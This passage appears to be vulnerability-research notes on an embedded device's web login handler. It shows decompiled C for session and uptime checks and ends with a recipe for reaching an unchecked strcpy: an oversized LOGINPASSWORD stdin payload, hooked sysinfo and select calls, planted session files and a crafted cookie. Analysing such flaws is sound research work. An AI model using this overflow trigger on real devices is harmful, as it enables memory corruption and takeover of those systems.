  char v20[192]; // [sp+360h] [+360h] BYREF
  char v21[128]; // [sp+420h] [+420h] BYREF
  int nn_cookie_uid; // [sp+4A8h] [+4A8h]

  memset(v17, 0, sizeof(v17));
  memset(nn_uid, 0, sizeof(nn_uid));
  memset(v19, 0, sizeof(v19));
  memset(v20, 0, sizeof(v20));
  v2 = 0;
  nn_cookie_uid = strstr(nn_cookie, "uid=");
  if ( !nn_cookie_uid )
    return -2;
  strncpy(nn_uid, nn_cookie_uid + 4, 10);
  v3 = nn_check_session((int)v14, nn_uid);
  if ( v3 < 0 )
    return -2;
  if ( !nn_get_session((int)v14, v3, 0) )
  {
    sub_41C6EC(v15, v16, v21);
    strcpy(v20, v16);
    strcpy(v19, v15);
    nn_loginpassowrd = sub_41C560((int)"LOGINPASSWORD");  
    if ( nn_loginpassowrd )
      strcpy(v17, nn_loginpassowrd);
    if ( strcmp(v21, v17) )
    {
      v2 = -1;
      sub_41C94C("failed");
    }
    else
    {
      sub_41C94C("success");
      sub_40E234(nn_uid);
      v4 = sub_40D4F0(v7, nn_uid);
      strcpy(v9, nn_uid);
      v6 = sub_41C560((int)"USERNAME");
      if ( v6 )
        strcpy(v10, v6);
      strcpy(v11, v20);
      strcpy(v12, v19);
      v13 = 12288;
      v8 = 0;
      sub_40D338(v7, v4, 1);
    }
  }
  return v2;
}
```

in nn_check_session
```c
int __fastcall nn_check_session(int a1, _BYTE *nn_uid)
{
  int i; // [sp+18h] [+18h]

  if ( !a1 || !nn_uid || !*nn_uid )
    return -1;
  memset(a1, 0, 196);
  for ( i = 1; i < 129; ++i )
  {
    if ( !nn_get_session(a1, i, 0) && !nn_verify_uid(*(_DWORD *)(a1 + 128)) && !strcmp(a1, (int)nn_uid) )
      return i;
    memset(a1, 0, 196);
  }
  return -1;
}
```

```c
int __fastcall nn_get_session(int a1, int a2, int a3)
{
  int v4; // [sp+18h] [+18h]
  int v5; // [sp+1Ch] [+1Ch]
  char v6[64]; // [sp+20h] [+20h] BYREF

  v4 = -1;
  sprintf(v6, "%s/c%d", "/var/session", a2);
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v5 = open(v6, 770);
      if ( v5 != -1 )
      {
        if ( !lockf(v5, 1, 0) && write(v5, a1, 196) )
          v4 = 0;
LABEL_13:
        close(v5);
      }
    }
  }
  else
  {
    v5 = open(v6, 2);
    if ( v5 != -1 )
    {
      if ( !lockf(v5, 1, 0) && read(v5, a1, 196) == 196 )
        v4 = 0;
      goto LABEL_13;
    }
  }
  return v4;
}
```

```c
tcall nn_verify_uid(unsigned int a1)
{
  return a1 < nn_get_sysinfo();
}
```

```c
int nn_get_sysinfo()
{
  int v1[16]; // [sp+18h] [+18h] BYREF

  sysinfo(v1);
  return v1[0];
}
```

```c
           struct sysinfo {
               long uptime;             /* Seconds since boot */
               unsigned long loads[3];  /* 1, 5, and 15 minute load averages */
               unsigned long totalram;  /* Total usable main memory size */
               unsigned long freeram;   /* Available memory size */
               unsigned long sharedram; /* Amount of shared memory */
               unsigned long bufferram; /* Memory used by buffers */
               unsigned long totalswap; /* Total swap space size */
               unsigned long freeswap;  /* Swap space still available */
               unsigned short procs;    /* Number of current processes */
               unsigned long totalhigh; /* Total high memory size */
               unsigned long freehigh;  /* Available high memory size */
               unsigned int mem_unit;   /* Memory unit size in bytes */
               char _f[20-2*sizeof(long)-sizeof(int)];
                                        /* Padding to 64 bytes */
           };
```

We need 
- hook syscall sysinfo to control uptime 
- hook syscall select ,stdin= `b'ACTION=login&LOGINPASSWORD=' + b'A' * 0x248`
- control /var/session/c* = `b"AAAA\x00" + b"A"*0xbf`
- Cookie : uid=AAAA
To reach `strcpy(v17, nn_loginpassowrd)`